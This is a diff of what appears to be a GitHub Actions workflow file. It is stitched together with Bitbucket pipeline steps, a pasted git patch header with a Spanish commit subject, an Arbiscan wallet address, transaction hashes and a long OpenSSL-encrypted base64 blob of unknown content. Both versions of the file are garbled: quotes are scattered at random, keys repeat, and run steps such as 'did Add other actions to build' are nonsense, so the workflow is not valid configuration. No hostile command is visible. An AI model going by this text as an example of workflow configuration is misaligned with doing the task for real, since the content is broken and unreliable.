@@ -1,8 +1,14 @@
-# This is a basic workflow to help you get started with Actions
-https://arbiscan.io/address/0xf58ce..E0c27
-- step:
-    name: Deploy to test
-    deployment: test
+"[![.github/workflows/blank.yml](https://github.com/0xf58ce/DIPs/actions/workflows/blank.yml/badge.svg?event=check_run)](https://github.com/0xf58ce/DIPs/actions/workflows/blank.yml)# This is a basic workflow to help you get started with Actions
+"https://arbiscan.io/address/0xf58ce..E0c27
+- step: "0xf58ce..E0c27"
+- step: "0xf58ce..E0c27",
+    name: "hash"
+    deployment: "0x9a627d332d3f0f3190fe6bc7b6362bd6c582369a739e3590292cdad75db4ca3e",
+    # trigger: manual  # Uncomment to make this a manual deployment.
+    script: "2024/01"
+      -  "Deploying to test environment"
+    name: "Deploy to confirm" 
+    deployment: "0x9a627d332d3f0f3190fe6bc7b6362bd6c582369a739e3590292cdad75db4ca3e"
     # trigger: manual  # Uncomment to make this a manual deployment.
     script:
       - echo "Deploying": "Alphawallet Version 3.87(273)":"tokenscript 2024/01",
@@ -17,35 +23,32 @@ on:
   # Allows you to run this workflow manually from the Actions tab
   workflow_dispatch:
   "https://arbiscan.io/address/0xf58ce..E0c27":"true"
-"check":From 5d8dfe8ddf987a49df9e99b3100ab399f2d67832 Mon Sep 17 00:00:00 2001
-From: 0xf58ce natina <walletaplapprouve@gmail.com>
-Date: Wed, 5 Feb 2025 22:44:03 +0000
-Subject: [PATCH] =?UTF-8?q?README.md=20editado=20a=20trav=C3=A9s=20de=20la?=
- =?UTF-8?q?=20web=20en=20Bitbucket?=
+"check": "From 5d8dfe8ddf987a49df9e99b3100ab399f2d67832 Mon Sep 17 00:00:00 2001
+From: " 0xf58ce natina <walletaplapprouve@gmail.com>
+Date: "Wed, 5 Feb 2025 22:44:03 +0000
+Subject: "[PATCH] =?UTF-8?q?README.md=20editado=20a=20trav=C3=A9s=20de=20la?=
+" =?UTF-8?q?=20web=20en=20Bitbucket?=
 MIME-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 8bit
+Content-Type: "text/plain; charset=UTF-8
+Content-Transfer-Encoding: " 8bit
 
----
- README.md | 2 +-
- 1 file changed, 1 insertion(+), 1 deletion(-)
+"---
+" README.md | 2 +-
+" 1 file changed, 1 insertion(+), 1 deletion(-)
 
-diff --git a/README.md b/README.md
-index 82ad22a..71b31f0 100644
---- a/README.md
-+++ b/README.md
-@@ -33,7 +33,7 @@ Next, youâ€™ll add a new file to this repository.
+"diff --git a/README.md b/README.md
+'index 82ad22a..71b31f0 100644
+"--- a/README.md
+"+++ b/README.md
+"@@ -33,7 +33,7 @@ Next, youâ€™ll add a new file to this repository.
  
- Before you move on, go ahead and explore the repository. You've already seen the **Source** page, but check out the **Commits**, **Branches**, and **Settings** pages.
+' Before you move on, go ahead and explore the repository. You've already seen the **Source** page, but check out the **Commits**, **Branches**, and **Settings** pages.
  
-----
-+---U2FsdGVkX18xYyU63EsQtoZwDKvGipmBJV2gInwVoe77Feq5UinQCNiqmTMwXhxebEuVavKpqzEt8zcALbg/9c91LT84T4t8ZZfvs+LxBcnkQE+E1Ldx9+0Rn7Y5vc+DDqiVEWNRRC+nT/gf0x46nzW/Gt3jBXX0Vukk2mvpGZAh3D7LydObGDVCMGm02tY5v0kZjTmYDctKe7irt7XRg/4TwFb4Hf2855xxcJJbIy/EhJb5wJK/3pOckb73/eRQ2hOl0WnNFrbgSTAmOUPrKMtMAszixyg5TNGS1QkpaHCnKzvj3e8I+h/xQk3hKriufBoWFizp2VphSk1knxiE+V2Ylp+jS/pGlrpjUIbBZOS2fXIqUqry8FtSdDzZ52WkghrbmgbQHiAsFkgpMH6e7p8mMxkfOdMUG9iU2FKtZnpwmbj/hjyc0CABZ3i0fSGc9BlfcuJiwk1U4CdXB5waXli13z9bjgx1KXzY/ZKHmbqPIH39eg0j4Ka3G+S3/KPS7nK54Kb/WsV0AWWSYQNXUA+9A2xcVJ517btuiweeiOTnkov3veJ7lWzKV5ycQOVsL8CxQuZVLit4UF9zVFWk3bEpBlOUn+Dosmuaq9W0TMT1f5RnEerMtc8Rbzs2tACtm8ypWq2ynlYStd74JiCszfD3fAFP4v0PAJ7aBYxzdkp88B+z8JK0TkiedhxYPL5poa2UIwEhWcc7JcvjtbUG0Ur3gvF42lKoX83oO5aA9IprAcviO346CseyGbgTtvUFtCl2fYajlIcR2GUafIW7jwHMT1uL7yKl8eN+cYfZu7HZuUIJrVm1ku+M8KB0M0GdCipsWTpeEbLC9sJRFIYuZTiMlEEK0vhw7j/5HSr5XJdEaCAeclTa9TlR/E6W2EV0dSh61g0yjhjadsyvDXWX/hvyfcpm345Z4u2BrzCWs5mLptlM1wK97qCBmekKRPS1GBviWMacUdOLtyr7havHvhMmoI5TaIzEFpTkoNIbAwSHUfBWQmk/p5HcgAqvtOifuGP2Qq1QtFm0in1N87KrwG/uqovBxCX/37z/ndprRS6n75JiJBsZVE9x7hzKdZVAiLZPPJKsU2T77DuTwrFVOtXFrhxMLRtibkG1QsvzfYk5DmvR83qQQ51fNVwO9tTcyPPKrd/cTOOWWddFWWMDtQ5L1W0lCI7qFTK60bZhJk
- 
- a repository
- 
--- 
-2.46.
-2
+"----
+'+---U2FsdGVkX18xYyU63EsQtoZwDKvGipmBJV2gInwVoe77Feq5UinQCNiqmTMwXhxebEuVavKpqzEt8zcALbg/9c91LT84T4t8ZZfvs+LxBcnkQE+E1Ldx9+0Rn7Y5vc+DDqiVEWNRRC+nT/gf0x46nzW/Gt3jBXX0Vukk2mvpGZAh3D7LydObGDVCMGm02tY5v0kZjTmYDctKe7irt7XRg/4TwFb4Hf2855xxcJJbIy/EhJb5wJK/3pOckb73/eRQ2hOl0WnNFrbgSTAmOUPrKMtMAszixyg5TNGS1QkpaHCnKzvj3e8I+h/xQk3hKriufBoWFizp2VphSk1knxiE+V2Ylp+jS/pGlrpjUIbBZOS2fXIqUqry8FtSdDzZ52WkghrbmgbQHiAsFkgpMH6e7p8mMxkfOdMUG9iU2FKtZnpwmbj/hjyc0CABZ3i0fSGc9BlfcuJiwk1U4CdXB5waXli13z9bjgx1KXzY/ZKHmbqPIH39eg0j4Ka3G+S3/KPS7nK54Kb/WsV0AWWSYQNXUA+9A2xcVJ517btuiweeiOTnkov3veJ7lWzKV5ycQOVsL8CxQuZVLit4UF9zVFWk3bEpBlOUn+Dosmuaq9W0TMT1f5RnEerMtc8Rbzs2tACtm8ypWq2ynlYStd74JiCszfD3fAFP4v0PAJ7aBYxzdkp88B+z8JK0TkiedhxYPL5poa2UIwEhWcc7JcvjtbUG0Ur3gvF42lKoX83oO5aA9IprAcviO346CseyGbgTtvUFtCl2fYajlIcR2GUafIW7jwHMT1uL7yKl8eN+cYfZu7HZuUIJrVm1ku+M8KB0M0GdCipsWTpeEbLC9sJRFIYuZTiMlEEK0vhw7j/5HSr5XJdEaCAeclTa9TlR/E6W2EV0dSh61g0yjhjadsyvDXWX/hvyfcpm345Z4u2BrzCWs5mLptlM1wK97qCBmekKRPS1GBviWMacUdOLtyr7havHvhMmoI5TaIzEFpTkoNIbAwSHUfBWQmk/p5HcgAqvtOifuGP2Qq1QtFm0in1N87KrwG/uqovBxCX/37z/ndprRS6n75JiJBsZVE9x7hzKdZVAiLZPPJKsU2T77DuTwrFVOtXFrhxMLRtibkG1QsvzfYk5DmvR83qQQ51fNVwO9tTcyPPKrd/cTOOWWddFWWMDtQ5L1W0lCI7qFTK60bZhJk 
+"-- 
+"2.46.
+"2
 
 # A workflow run is made up of one or more jobs that can run sequentially or in parallel
 jobs: "all",
@@ -66,5 +69,5 @@ jobs: "all",
       # Runs a set of commands using the runners shell
       - name: "tokenscript 2024/01"
         run: "Alphawallet",
-          echo Add other actions to build,
-          echo test, and deploy your project.
+           "did Add other actions to build,
+          "did test, and deploy your project.
